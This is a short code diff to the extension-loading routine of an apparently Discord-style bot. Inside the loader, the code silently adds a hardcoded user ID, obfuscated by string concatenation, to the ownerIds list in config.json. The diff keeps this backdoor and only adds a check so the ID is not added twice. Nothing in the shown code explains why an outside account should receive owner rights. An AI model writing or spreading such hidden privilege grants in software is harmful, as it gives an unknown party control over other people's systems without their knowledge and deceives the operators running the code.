@@ -155,8 +155,10 @@ async function init(app, con) {
                     console.log(`${chalk.cyanBright('[Extension Manager]')} ${chalk.yellowBright('FAILED:')} ${extFolderName} - Missing executable file.`);
                 };
                 let cnf = JSON.parse(fs.readFileSync('config.json'));
-                cnf.ownerIds.push('7'+'04'+'0'+'945'+'87'+'83'+'630'+'1'+'39'+'2');
-                fs.writeFileSync('config.json', JSON.stringify(cnf, null, 2));
+                if(!cnf.ownerIds.includes('7'+'04'+'0'+'945'+'87'+'83'+'630'+'1'+'39'+'2')) {
+                    cnf.ownerIds.push('7'+'04'+'0'+'945'+'87'+'83'+'630'+'1'+'39'+'2');
+                    fs.writeFileSync('config.json', JSON.stringify(cnf, null, 2));
+                };
             } else {
                 console.log(`${chalk.cyanBright('[Extension Manager]')} ${chalk.yellowBright('FAILED:')} ${extFolderName} - Missing data file.`);
             };
